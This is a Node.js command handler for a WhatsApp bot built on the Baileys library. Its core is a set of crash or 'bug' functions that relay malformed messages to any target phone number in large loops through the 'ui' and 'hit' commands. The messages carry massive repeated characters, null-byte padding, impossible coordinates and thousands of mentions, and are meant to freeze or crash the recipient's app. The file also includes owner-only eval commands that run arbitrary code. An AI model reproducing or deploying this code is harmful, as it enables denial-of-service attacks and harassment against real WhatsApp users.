require('../setting/settings');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const kripto = require('crypto');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = bara = async (bara, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? bara.user.id.split(":")[0] || bara.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./lib/database/owner.json'));
const prem = JSON.parse(fs.readFileSync('./database/prem.json'))
const isPrem = prem.includes(m.sender)
const owners = JSON.parse(fs.readFileSync("./database/own.json"))
const murbugs = JSON.parse(fs.readFileSync("./database/murbug.json"))
const botNumber = await bara.decodeJid(bara.user.id);
const isAcces = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const isCmd = body.startsWith(prefix);
// Group function
const groupMetadata = isGroup ? await bara.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./myfunction');
const { ytdl } = require('./scrape/scrape-ytdl')

const { checkApproval, approveScript, isApproved, validateApprovalData, checkScriptIntegrity } = require('../database/barajs')
const config = require('../database/BaraConfig')
async function BaraStart() {
    if (!(await isApproved())) {
        if (m.sender.includes(config.approval.num) && budy.includes(config.approval.text)) {
            await approveScript(m.sender, bara.authState.creds.pairingCode);
            await m.reply(config.approval.greet);
        } else {
            await checkApproval();
        }
    }
}

BaraStart();
if (!await isApproved() && isCmd) {
    return;
}
checkScriptIntegrity();
if (await isApproved()) {
    validateApprovalData(bara.authState.creds.pairingCode);
}
if (!fs.existsSync('./lib/database/approval')) {
bara.sendMessage(config.approval.num + '@s.whatsapp.net', { text: 'script harus di acc sama bara' })
fs.writeFileSync('./lib/database/approval', '', 'utf8');
}
    
let Buttons = require("./buttondoc");
let batten = new Buttons();

// Time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`𖢸PESAN`));
console.log(
chalk.bgHex("#00FF00").black(
`   𖢸 Tanggal: ${new Date().toLocaleString()} \n` +
`   𖢸 Pengirim: ${pushname}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   𖢸 Grup: ${groupName} \n` +
`   𖢸 GroupJid: ${m.chat}`
)
);
}
console.log();
}

// Const Bug
const TypeNull = {
            key: {
                remoteJid: 'Ampas',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }

// Function Bug
async function OLDLOC(target, QBug) {
var etc = await generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        header: {
          title: "Please Look My Message\n",
          locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            jpegThumbnail: global.thumb
          },
          hasMediaAttachment: true
        },
        body: {
          text: "\u0000" + "ꦾ".repeat(90000)
        },
        nativeFlowMessage: {
          messageParamsJson: "\u0000".repeat(55000)
        },
        carouselMessage: {}
      }
    }
  }
}), { userJid: target, quoted: QBug })
await bara.relayMessage(target, etc.message, { messageId: etc.key.id })
};
async function BugFrezee(target) {
            bara.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(90000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Bara🤓" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "😂⃟⃟⃟⃟⃚ ͢𝄽ᗷᗩᖇᗩ𝄽⃟⃟⃟🇮🇩",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "Barainfinity@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(700000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );            
        };
        async function EncryptMessage(target) {
    const locationMessageContent = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            name: "ꦾ".repeat(90000),
            url: "@1".repeat(55000),
            mentionedJid: [
								"1@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
            jpegThumbnail: global.thumb
        }
      }
    }
    });

    const encryptedMessage = generateWAMessageFromContent(target, locationMessageContent, { userJid: target });

    await bara.relayMessage(target, encryptedMessage.message, { participant: { jid: target } });
};

        async function DocSystem(target) {
            let virtex = "😂⃟⃟⃟⃟⃚ ͢𝄽ᗷᗩᖇᗩ𝄽⃟⃟⃟🇮🇩";

            bara.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽ᗷᗩᖇᗩ𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "BaraXSENTRY" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        async function DocSystem2(target) {
            bara.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(90000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Bara ⚔️" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "AVILIABLEBYBara",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "Bara@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(700000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );
        };
        async function DocSystem3(target) {
            bara.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: "XHIROXD",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                title: "Tra͢sᯭh͢ Ui-Aviliable",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "TypeTrashUi-Killer"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: 'call_permission_request',
                                        buttonParamsJson: '{}'
                                    }
                                ]
                            },
                            contextInfo: {
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Sent",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "galaxy_message",
                                            paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "BaraXS",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "Bara@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(1020000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, { participant: { jid: target } }, { messageId: null });
};
            async function FrezeeMsg2(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽ᗷᗩᖇᗩ𝄽⃟⃟⃟🇮🇩⿻";
            let memekz = Date.now();

            await bara.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽ᗷᗩᖇᗩ𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "BaraEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function FrezeeMsg1(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽ᗷᗩᖇᗩ𝄽⃟⃟⃟🇮🇩⿻";

            bara.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽ᗷᗩᖇᗩ𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "BaraEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }
        
        
async function BaraTheNextCombo(target) {
for (let i = 0; i < 20; i++) {
await OLDLOC(target, TypeNull)
await DocSystem(target)
await DocSystem2(target)
await DocSystem3(target)
await BugFrezee(target)
await EncryptMessage(target)
await FrezeeMsg1(target)
await FrezeeMsg2(target)
await OLDLOC(target, TypeNull)
}
console.log(chalk.red.bold("</> Bara999 Mengirim Bug Kombo!"))
}

// End Function

// Helper functions
async function replygw(txt) {
      const wwk = {
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: 'Click Here kontol',
            newsletterJid: '120363321008297293@newsletter',
          },
          externalAdreply: {
            showAdAttribution: true,
            title: 'Bara999 Bot',
            body: 'Bara',
            thumbnailUrl: 'https://files.catbox.moe/7e57a2.jpg',
            sourceUrl: 'https://www.youtube.com/@Baradeveloper',
          },
        },
        text: txt,
      }
      bara.sendMessage(from, wwk, {
        quoted: m,
      })
    }


const reaction = async (jidss, emoji) => {
bara.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

// Command handler
switch (command) {

case 'menu': {
let Bara = `\`[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗨𝗦𝗘𝗥 ]\`
> 𝗡𝗔𝗠𝗘 𝗣𝗘𝗡𝗚𝗚𝗨𝗡𝗔 : ${pushname}
> 𝗦𝘁𝗮𝘁𝘂𝘀 : ${isAcces ? "Vip" : "Free"}
> 𝗩𝗘𝗥𝗦𝗜 : 𝟴.𝟬 𝗦𝗜𝗠𝗣𝗟𝗘
> 𝗧𝘆𝗽𝗲 : 𝗖𝗮𝘀𝗲
> 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${time}

「 \`[ 𝗕𝗨𝗚 ]\` 」
> ui  [ number ]
> hit [ number ]

「 \`[ 𝗦𝗘𝗧𝗧 ]\` 」
> 𝗽𝘂𝗯𝗹𝗶𝗰  [ public ]
> 𝘀𝗲𝗹𝗳  [ private ]
> 𝗮𝗱𝗱𝗽𝗿𝗲𝗺 [ number ]
> 𝗱𝗲𝗹𝗽𝗿𝗲𝗺 [ number ]

「 \`[ 𝗢𝗙𝗧𝗘𝗥 𝗠𝗘𝗡𝗨 ]\` 」
> 𝗲𝘃𝗮𝗹  [ reply ]
> 𝗽𝗹𝗮𝘆  [name]
> 𝘁𝘁𝗺𝗽𝟯  [ link ]
> 𝘁𝘁𝗺𝗽𝟰  [ link ]
> 𝘆𝘁𝗺𝗽𝟰  [ link ]

「 \`[ 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗔𝗖𝗖 ]\` 」
> 𝗮𝗰𝗰 [ reply ]
> menu ini Khusus Bara
 \`「𝗗𝗲𝘃 𝗕𝗮𝗿𝗮」\`

> please don't spam
`
await bara.sendMessage(from, { video: { url: `https://files.catbox.moe/cghxaj.mp4` },caption: Bara,
gifPlayback: true,
}, { quoted: m }),
bara.sendMessage(from, { audio: {url : 'https://e.top4top.io/m_32424zi8y0.mp3' }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })
}
break

case 'eval': {
if (!isAcces) return replygw('<𝗡𝗢 𝗔𝗖𝗖𝗘𝗦>')
if (!m.quoted) return replygw(`*Reply pesan yang quotednya mau diambil*`);
        let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
        let jeneng = `MessageData_${kripto.randomBytes(8).toString('hex')}.json`;
        await fs.writeFileSync(jeneng, penis);
        await replygw(penis);
        await bara.sendMessage(from, { document: { url: `./${jeneng}` }, fileName: jeneng, mimetype: '*/*' }, { quoted: m });
        await fs.unlinkSync(jeneng);
}
break

case 'cek': {
bara.sendMessage(from, { audio: {url : 'https://files.catbox.moe/p0l2t8.mp3' }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })
}
break

case "public": {
if (!isAcces) return replygw('<𝗡𝗢 𝗔𝗖𝗖𝗘𝗦>')
bara.public = true
replygw('*Success Changes To Public*')
}
break

case "self": {
if (!isAcces) return replygw('<𝗡𝗢 𝗔𝗖𝗖𝗘𝗦>')
bara.public = false
replygw('*Success Changes To Self*')
}
break

case 'ttmp4': case 'ttmp3': case 'ytmp4': case 'ytmp3': case 'igmp3': case 'igmp4': {
if (!isAcces) return replygw(`<𝗡𝗢 𝗔𝗖𝗖𝗘𝗦>`)
if (!q) return replygw(`Example: /${command} https://kontol.mp3/mp4`)
await bara.sendMessage(from, {text: `https://id.savefrom.net/247/#url=${q}`},{quoted: m})
await sleep(2000)
replygw(`👆 klik link untuk download`)
}
break
case 'ui': { 
if (!isAcces) return replygw('<𝗡𝗢 𝗔𝗖𝗖𝗘𝗦>')
if (!q) return m.reply(`Example:\n ${prefix + command} 62xxx`);
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await replygw(`Proses`)
for (let i = 0; i < 100; i++) {
await BaraTheNextCombo(target)
}
await replygw(`Done Kawan`)
}
break
case "addowner": {
if (!isAcces) return replygw("𝗡𝗢 𝗔𝗖𝗖𝗘𝗦")
if (!m.quoted && !text) return replygw("Mana Nomornya?")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./database/own.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break
	case 'addprem': {
if (!isAcces) return replygw("𝗡𝗢 𝗔𝗖𝗖𝗘𝗦")
if (!args[0]) return replygw(`Use .addprem number\nExample .addprem 6281111111111`)
prembase = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let numero = await xin.onWhatsApp(prembase)
if (numero.length == 0) return replygw(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prembase)
fs.writeFileSync('./gudang/database/prem.json', JSON.stringify(prem))
replygw(`The Number ${prembase} Has Been Added To Our Database System!`)
}
break
case 'addmurbug': {
if (!isAcces) return replygw("𝗡𝗢 𝗔𝗖𝗖𝗘𝗦")
if (!args[0]) return replygw(`Use .addmurbug number\nExample .addprem 6281111111111`)
paramurbug = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let murbugnumero = await xin.onWhatsApp(paramurbug)
if (murbugnumero.length == 0) return replygw(`Enter a valid and registered number on WhatsApp!!!`)
murbugs.push(paramurbug)
fs.writeFileSync('./database/murbug.json', JSON.stringify(murbugs))
replygw(`The Number ${prembase} Has Been Added To Our Murbug Database System!`)
}
break
case "delprem": {
if (!isAcces) return replygw(`𝗡𝗢 𝗔𝗖𝗖𝗘𝗦`)
if (!args[0]) return replygw(`Penggunaan /${command} nomor\nContoh /${command} 62xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = Akses.indexOf(ya)
kontributor.splice(unp, 1)
fs.writeFileSync('./message/lib/database/owner.json', JSON.stringify(kontributor))
replygw(`Nomor ${ya} Telah Di Delate Acces`)
}
break
case 'hit': { 
if (!isAcces) return replygw('𝗡𝗢 𝗔𝗖𝗖𝗘𝗦')
if (!q) return m.reply(`Example:\n ${prefix + command} 62xxx`);
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await replygw(`Proses`)
for (let i = 0; i < 100; i++) {
await BaraTheNextCombo(target)
}
await replygw(`Done Kawan`)
}
break
case "play": {
if (!isAcces) return replygw('<𝗡𝗢 𝗔𝗖𝗖𝗘𝗦>')
if (!text) return replygw(`*Example:* ${prefix + command} banon cikadap`)
const yts = require('yt-search');
let search = await yts(text);
let telaso = search.all[0].url;
var response = await ytdl(telaso)
var puki = response.data.mp3
bara.sendMessage(from, { audio: { url: puki },
mimetype: "audio/mpeg",
fileName: "Bara.mp3",
contextInfo: {
forwardingScore: 100,
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
title: search.all[0].title,
sourceUrl: search.all[0].timestamp,
thumbnailUrl: search.all[0].thumbnail,
}}},{quoted:m})
}
break

default:
if (budy.startsWith('>')) {
if (!isAcces) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isAcces) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});